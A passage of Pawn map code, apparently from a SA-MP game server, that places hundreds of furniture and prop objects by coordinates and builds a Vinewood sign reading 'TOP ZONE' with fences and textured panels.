	CreateDynamicObject(2522, 1691.02844, 3856.65259, 6.39420,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1738, 1692.65332, 3854.90039, 6.97820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1738, 1688.65198, 3848.12012, 6.99450,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1734, 1690.42761, 3849.91772, 10.12410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1690.42761, 3854.31787, 10.12410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19786, 1706.08386, 3853.65063, 8.44220,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2229, 1706.40576, 3851.74756, 7.80010,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2229, 1706.40576, 3854.94751, 7.80010,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1723, 1701.83374, 3852.67090, 6.39270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1724, 1704.07141, 3851.22363, 6.39230,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1724, 1702.95142, 3855.98364, 6.39230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2315, 1703.52844, 3852.87354, 6.39360,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2313, 1705.88916, 3854.35181, 6.39240,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2124, 1698.53955, 3859.46069, 7.17630,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2117, 1702.40039, 3860.41577, 6.39240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2117, 1700.41235, 3860.41577, 6.39240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2117, 1698.42041, 3860.41577, 6.39240,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2124, 1699.97961, 3859.46069, 7.17630,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2124, 1701.89966, 3859.46069, 7.17630,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2124, 1703.24365, 3859.46069, 7.17630,   0.00000, 0.00000, -89.94000);
	CreateDynamicObject(2124, 1703.24365, 3861.38062, 7.17630,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(2124, 1701.89966, 3861.38062, 7.17630,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(2124, 1699.97961, 3861.38062, 7.17630,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(2124, 1698.53955, 3861.38062, 7.17630,   0.00000, 0.00000, 89.94000);
	CreateDynamicObject(2124, 1704.37170, 3860.42041, 7.17630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2124, 1697.38770, 3860.42041, 7.17630,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1734, 1690.84436, 3845.57935, 10.12310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1694.37244, 3845.57935, 10.12310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1700.76746, 3845.57935, 10.12310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1700.76746, 3853.49634, 10.12310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1702.67834, 3860.41235, 10.12310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1701.04041, 3860.41235, 10.12310,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1699.12939, 3860.41235, 10.12310,   0.00000, 0.00000, -0.06000);
	CreateDynamicObject(11724, 1700.65833, 3838.37671, 6.91420,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(11725, 1700.65686, 3838.45557, 6.79860,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1723, 1698.66370, 3838.59180, 6.39360,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1723, 1695.69666, 3839.67480, 6.39360,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1819, 1696.93262, 3839.87500, 6.39350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 1704.72668, 3838.59180, 6.39360,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1724, 1705.56506, 3840.75586, 6.39140,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1819, 1703.32458, 3839.87500, 6.39350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19786, 1700.74097, 3838.07739, 8.89710,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2229, 1698.94556, 3837.66992, 8.26040,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2229, 1701.93762, 3837.66992, 8.26040,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2266, 1697.24902, 3838.62109, 8.45800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2269, 1704.18506, 3838.62109, 8.45800,   0.00000, 0.00000, 180.06000);
	CreateDynamicObject(19929, 1694.52734, 3860.99194, 6.39470,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19937, 1694.61157, 3861.48145, 9.43170,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19937, 1694.61157, 3859.56641, 9.43170,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19931, 1694.52734, 3857.82275, 6.39340,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19937, 1694.61157, 3857.65430, 9.43170,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19926, 1693.17517, 3864.28784, 6.39210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19923, 1691.31396, 3864.41187, 6.33750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19926, 1689.47925, 3864.28784, 6.39210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19926, 1687.56519, 3864.28784, 6.39210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19924, 1691.30835, 3864.85474, 9.62510,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19937, 1693.03406, 3864.52393, 9.11650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19937, 1691.12012, 3864.52393, 9.11650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19937, 1689.20605, 3864.52393, 9.11650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19937, 1687.29211, 3864.52393, 9.11650,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19926, 1687.30115, 3862.90186, 6.39210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19927, 1687.30017, 3860.98389, 6.39430,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19916, 1687.28650, 3858.90430, 6.39510,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19931, 1687.30115, 3859.67188, 6.39210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19931, 1687.30115, 3858.14185, 6.39210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19937, 1687.08691, 3862.89404, 9.11650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19937, 1687.08691, 3860.99023, 9.11650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19937, 1687.08691, 3859.08618, 9.11650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19937, 1687.08691, 3864.79810, 9.11650,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19926, 1693.19800, 3857.82349, 6.39450,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19926, 1691.29004, 3857.82349, 6.39450,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19926, 1689.37903, 3857.82349, 6.39450,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19926, 1687.46802, 3857.82349, 6.39450,   0.00000, 0.00000, -89.94000);
	CreateDynamicObject(19937, 1693.44446, 3857.62476, 9.43270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19937, 1691.53052, 3857.62476, 9.43270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19937, 1689.61646, 3857.62476, 9.43270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19937, 1687.70251, 3857.62476, 9.43270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2851, 1687.24915, 3861.49512, 7.11410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2863, 1687.31250, 3860.43262, 7.28090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19584, 1690.91223, 3864.35107, 7.48340,   0.00000, 0.00000, 87.00000);
	CreateDynamicObject(19830, 1692.65369, 3864.53271, 7.32170,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19813, 1692.85779, 3864.72559, 7.42900,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19822, 1694.53625, 3860.26416, 7.31800,   0.00000, 0.00000, -0.06000);
	CreateDynamicObject(19819, 1694.58435, 3860.58081, 7.39500,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19819, 1694.58435, 3860.99365, 7.39500,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19819, 1694.58435, 3859.93164, 7.39500,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19820, 1694.47729, 3862.27002, 7.31800,   0.00000, 0.00000, -0.06000);
	CreateDynamicObject(19821, 1694.71326, 3862.27026, 7.31800,   0.00000, 0.00000, -0.12000);
	CreateDynamicObject(19823, 1694.71326, 3862.15210, 7.31800,   0.00000, 0.00000, -0.06000);
	CreateDynamicObject(19824, 1694.59534, 3862.09326, 7.31800,   0.00000, 0.00000, -0.06000);
	CreateDynamicObject(19818, 1694.45215, 3862.08960, 7.39810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 1694.26819, 3862.08960, 7.39810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 1694.26819, 3862.26563, 7.39810,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19581, 1691.94775, 3864.05518, 7.36320,   0.00000, 0.00000, -86.00000);
	CreateDynamicObject(19582, 1691.50342, 3864.00122, 7.38600,   0.00000, 0.00000, 91.00000);
	CreateDynamicObject(19583, 1690.74475, 3863.99341, 7.32750,   0.00000, 0.00000, 164.00000);
	CreateDynamicObject(19582, 1690.52734, 3864.05713, 7.33300,   0.00000, 0.00000, 135.00000);
	CreateDynamicObject(19582, 1690.61536, 3864.05713, 7.33000,   0.00000, 0.00000, 105.00000);
	CreateDynamicObject(19630, 1690.54456, 3864.53955, 7.31940,   90.00000, 0.00000, 171.00000);
	CreateDynamicObject(19630, 1690.64050, 3864.40356, 7.31940,   90.00000, 0.00000, 145.00000);
	CreateDynamicObject(19882, 1692.58435, 3864.02710, 7.33110,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2848, 1687.28735, 3862.48071, 7.29930,   0.00000, 0.00000, -86.00000);
	CreateDynamicObject(2849, 1687.21936, 3863.32056, 7.29930,   0.00000, 0.00000, -86.00000);
	CreateDynamicObject(19579, 1692.11926, 3864.55127, 7.31960,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19883, 1692.14233, 3864.37109, 7.31960,   0.00000, 0.00000, -18.00000);
	CreateDynamicObject(19883, 1692.04028, 3864.37109, 7.32760,   0.00000, 0.00000, 12.00000);
	CreateDynamicObject(11744, 1692.59241, 3864.02783, 7.31780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19580, 1689.08765, 3864.28369, 7.31520,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19569, 1689.58838, 3864.57446, 7.31540,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19560, 1689.17615, 3864.60205, 7.31540,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19568, 1688.60840, 3864.59692, 7.31550,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19563, 1687.74744, 3864.54834, 7.31500,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19564, 1687.95142, 3864.54858, 7.31500,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19562, 1687.81543, 3864.65039, 7.31500,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19592, 1691.28589, 3857.80273, 7.81020,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19574, 1691.13208, 3857.70313, 7.35920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19574, 1691.16626, 3857.77124, 7.35920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19574, 1691.26831, 3857.83911, 7.35920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19574, 1691.37024, 3857.70313, 7.35920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19574, 1691.47229, 3857.83911, 7.35920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19576, 1691.25098, 3857.71509, 7.37290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19576, 1691.08105, 3857.74902, 7.40690,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19576, 1691.45496, 3857.68115, 7.37290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19576, 1691.38696, 3857.81714, 7.37290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19575, 1691.31897, 3857.76489, 7.37290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19575, 1691.12097, 3857.88208, 7.37290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19575, 1691.34595, 3857.89697, 7.37290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19578, 1691.26831, 3857.68921, 7.41920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19578, 1691.28333, 3857.76392, 7.41920,   0.00000, 0.00000, 24.00000);
	CreateDynamicObject(19578, 1691.28333, 3857.80884, 7.41920,   0.00000, 0.00000, 38.00000);
	CreateDynamicObject(2864, 1687.92786, 3857.65381, 7.31780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2863, 1688.87292, 3857.72876, 7.31780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2865, 1690.01294, 3857.65381, 7.33280,   0.00000, 0.00000, 26.00000);
	CreateDynamicObject(11744, 1698.16589, 3860.44116, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1703.64392, 3860.44116, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1703.24792, 3860.70508, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1701.86194, 3860.70508, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1699.94788, 3860.70508, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1698.56189, 3860.70508, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1698.56189, 3860.11108, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1699.94788, 3860.11108, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1701.86194, 3860.11108, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(11744, 1703.24792, 3860.11108, 7.20400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19585, 1699.02124, 3860.44263, 7.37600,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19585, 1702.44824, 3860.44263, 7.37600,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19822, 1700.93213, 3860.40161, 7.19800,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 1700.73767, 3860.41699, 7.28230,   0.00000, 0.00000, 0.06000);
	CreateDynamicObject(19818, 1701.12976, 3860.41699, 7.28230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 1700.90564, 3860.19312, 7.28230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19818, 1700.90564, 3860.61304, 7.28230,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1486, 1703.19604, 3852.95361, 7.02850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1486, 1703.19604, 3853.59766, 7.02850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1486, 1703.19604, 3854.18579, 7.02850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1486, 1703.56006, 3854.63379, 7.02850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1486, 1703.56006, 3852.56177, 7.02850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19920, 1703.21082, 3853.27002, 6.88840,   0.00000, 0.00000, -84.00000);
	CreateDynamicObject(19896, 1703.22278, 3853.92871, 6.88830,   0.00000, 0.00000, -47.00000);
	CreateDynamicObject(19894, 1703.27881, 3852.61279, 6.88830,   0.00000, 0.00000, -47.00000);
	CreateDynamicObject(19893, 1697.09668, 3840.39722, 6.89040,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19893, 1679.39075, 3848.89575, 7.90000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2261, 1697.53430, 3861.88013, 8.27620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2262, 1699.55029, 3861.90820, 8.38820,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2269, 1701.65027, 3861.90820, 8.27620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2260, 1703.41431, 3861.93628, 8.41620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 1691.38977, 3860.99585, 10.12500,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1605, 1693.95203, 3850.60034, 8.27370,   0.00000, 16.00000, 0.00000);
	CreateDynamicObject(1606, 1693.71497, 3852.33545, 8.03200,   0.00000, 18.00000, 180.00000);
	CreateDynamicObject(1601, 1694.11145, 3852.90869, 8.11530,   0.00000, -18.00000, 0.00000);
	CreateDynamicObject(1601, 1694.27136, 3849.14868, 8.11530,   0.00000, -18.00000, 180.00000);
	CreateDynamicObject(2261, 1685.49036, 3847.22803, 8.83080,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2741, 1687.27405, 3856.44214, 8.11920,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2870, 1692.62024, 3851.33252, 7.39370,   0.00000, 0.00000, 70.00000);
	CreateDynamicObject(2384, 1692.48560, 3848.18140, 7.49750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2384, 1692.48560, 3848.77319, 7.49750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2749, 1686.96521, 3853.54565, 7.45180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2751, 1686.97974, 3853.36035, 7.49400,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2752, 1686.96521, 3853.70483, 7.45180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2750, 1687.37976, 3855.99170, 7.49630,   90.00000, 0.00000, -84.00000);
	//====================================== VINEWOOD ============================================//

	new UnitedT = CreateObject(7914,1416.3001, -811.6177, 80.0196, 0.0000, 0.0000, -0.3100,1000.0);
	SetObjectMaterialText(UnitedT, "{0066FF}TOP",0,  80, "Copperplate Gothic", 100, 1, -8092540, 0, 1);


 	new GamingG = CreateObject(7914, 1430.2831, -811.6177, 80.0196, 0.0000, 0.0000, 0.7933,1000.0);
	SetObjectMaterialText(GamingG, "{FFFFFF}Z",0,  80, "Copperplate Gothic", 100, 1, -16776961, 0, 1);

	new GamingA = CreateObject(7914, 1434.5492, -811.6177, 80.0196, 0.0000, 0.0000, -0.3100,1000.0);
	SetObjectMaterialText(GamingA, "{FFFFFF}  O",0,  80, "Copperplate Gothic", 100, 1, -8092540, 0, 1);

	new GamingM = CreateObject(7914, 1439.1312, -811.6177, 80.0196, 0.0000, 0.0000, -0.3100,1000.0);
	SetObjectMaterialText(GamingM, "{FFFFFF}  N",0,  80, "Copperplate Gothic", 100, 1, -8092540, 0, 1);

	new GamingI = CreateObject(7914, 1442.4492, -811.6177, 80.0196, 0.0000, 0.0000, -0.3100,1000.0);
	SetObjectMaterialText(GamingI, "{FFFFFF}   E",0,  80, "Copperplate Gothic", 100, 1, -8092540, 0, 1);
	
	CreateObject(708, 1453.94751, -796.65192, 84.43130,   0.00000, 0.00000, 0.00000,1000.00);
	CreateObject(708, 1429.29492, -795.15527, 84.43130,   0.00000, 0.00000, 0.00000,1000.00);
	CreateObject(708, 1405.79956, -794.44214, 81.76730,   0.00000, 0.00000, 0.00000,1000.00);
	CreateObject(708, 1382.73169, -800.44269, 78.54830,   0.00000, 0.00000, 0.00000,1000.00);
	CreateObject(708, 1471.35767, -803.43378, 77.32730,   0.00000, 0.00000, 0.00000,1000.00);

	CreateDynamicObject(640, 1402.68091, -814.05530, 75.33520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1393.57886, -814.05530, 75.33520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1460.28992, -814.05530, 75.33520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1451.85388, -814.05530, 75.33520,   0.00000, 0.00000, 90.00000);

 	CreateDynamicObject(16132, 1419.92017, -804.75421, 71.5690,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(16132, 1430.59924, -804.75421, 71.5690,   0.00000, 0.00000, 90.00000);


	new UGSIGNVWPOD[20];
	UGSIGNVWPOD[0] = CreateDynamicObject(18981, 1438.15344, -802.16431, 74.16960,   0.00000, 90.00000, 0.00000);
	UGSIGNVWPOD[1] = CreateDynamicObject(18981, 1413.15247, -802.16632, 74.17160,   0.00000, 90.00000, 0.00000);
	UGSIGNVWPOD[2] = CreateDynamicObject(18981, 1451.32336, -802.16632, 74.17160,   0.00000, 90.00000, 0.00000);
	UGSIGNVWPOD[3] = CreateObject(18656, 1394.45715, -811.51642, 73.94200,   123.18460, 0.00000, 90.00000,1000.00);
	UGSIGNVWPOD[4] = CreateDynamicObject(18981, 1402.95251, -802.16431, 74.16960,   0.00000, 90.00000, 0.00000);
	UGSIGNVWPOD[5] = CreateObject(18658, 1461.25696, -811.51642, 73.94200,   123.18460, 0.00000, -90.00000,1000.00);

	UGSIGNVWPOD[6] = CreateObject(18981, 1451.06335, -813.73230, 62.00360,   0.00000, 0.00000, 90.00000,1000.00);
	UGSIGNVWPOD[7] = CreateObject(18981, 1426.36340, -813.73230, 62.00360,   0.00000, 0.00000, 90.00000,1000.00);
	UGSIGNVWPOD[8] = CreateObject(18981, 1403.00549, -813.73230, 62.00360,   0.00000, 0.00000, 90.00000,1000.00);
	UGSIGNVWPOD[9] = CreateObject(18981, 1390.99646, -801.71832, 61.64160,   0.00000, 0.00000, 0.00000,1000.00);
	UGSIGNVWPOD[10] = CreateObject(18981, 1463.06445, -801.60828, 62.00360,   0.00000, 0.00000, 0.00000,1000.00);
	SetDynamicObjectMaterial(UGSIGNVWPOD[0],0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(UGSIGNVWPOD[1],0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(UGSIGNVWPOD[2],0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(UGSIGNVWPOD[4],0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);

	SetObjectMaterial(UGSIGNVWPOD[6],  0, 5870, "sunst18_lawn", "laspowrec2");
	SetObjectMaterial(UGSIGNVWPOD[7],  0, 5870, "sunst18_lawn", "laspowrec2");
	SetObjectMaterial(UGSIGNVWPOD[8],  0, 5870, "sunst18_lawn", "laspowrec2");
	SetObjectMaterial(UGSIGNVWPOD[9],  0, 5870, "sunst18_lawn", "laspowrec2");
	SetObjectMaterial(UGSIGNVWPOD[10],  0, 5870, "sunst18_lawn", "laspowrec2");


	CreateDynamicObject(2600, 1446.77136, -814.33441, 75.40750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2600, 1439.55652, -814.33441, 75.40750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2600, 1432.23035, -814.33441, 75.40750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2600, 1424.57129, -814.33441, 75.40750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2600, 1416.69031, -814.33441, 75.40750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2600, 1408.14331, -814.33441, 75.40750,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1445.33398, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1440.89404, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1438.34094, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1433.12402, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1431.23706, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1425.57605, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1423.68896, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1417.69495, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1415.58606, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1409.03699, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19279, 1407.03894, -814.22058, 74.66740,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1368, 1443.02637, -813.25201, 75.33450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1368, 1435.70044, -813.25201, 75.33450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1368, 1428.15234, -813.25201, 75.33450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1368, 1420.38245, -813.25201, 75.33450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1368, 1412.16846, -813.25201, 75.33450,   0.00000, 0.00000, 0.00000);

	new UGSIGNVWOGRADA[20];
	UGSIGNVWOGRADA[0] = CreateDynamicObject(970,1392.6646700,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[1] = CreateDynamicObject(970,1396.8227500,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[2] = CreateDynamicObject(970,1400.9146700,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[3] = CreateDynamicObject(970,1405.0727500,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[4] = CreateDynamicObject(970,1409.2307100,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[5] = CreateDynamicObject(970,1413.3886700,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[6] = CreateDynamicObject(970,1417.5467500,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[7] = CreateDynamicObject(970,1421.7047100,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[8] = CreateDynamicObject(970,1425.8626700,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[9] = CreateDynamicObject(970,1430.0207500,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[10] = CreateDynamicObject(970,1434.1787100,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[11] = CreateDynamicObject(970,1438.3366700,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[12] = CreateDynamicObject(970,1442.4947500,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[13] = CreateDynamicObject(970,1446.6527100,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[14] = CreateDynamicObject(970,1450.8106700,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[15] = CreateDynamicObject(970,1454.9687500,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[16] = CreateDynamicObject(970,1459.0606700,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[17] = CreateDynamicObject(970,1461.1727300,-814.5911900,75.1965000,0.0000000,0.0000000,0.0000000); //
	UGSIGNVWOGRADA[18] = CreateDynamicObject(970,1463.2846700,-812.4791900,75.1965000,0.0000000,0.0000000,90.0000000); //
	UGSIGNVWOGRADA[19] = CreateDynamicObject(970,1390.5666500,-812.4791900,75.1965000,0.0000000,0.0000000,90.0000000); //

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[0],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[0],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[1],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[1],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[2],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[2],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[3],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[3],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[4],0, 19325, "lsmall_shops", "lsmall_window01");
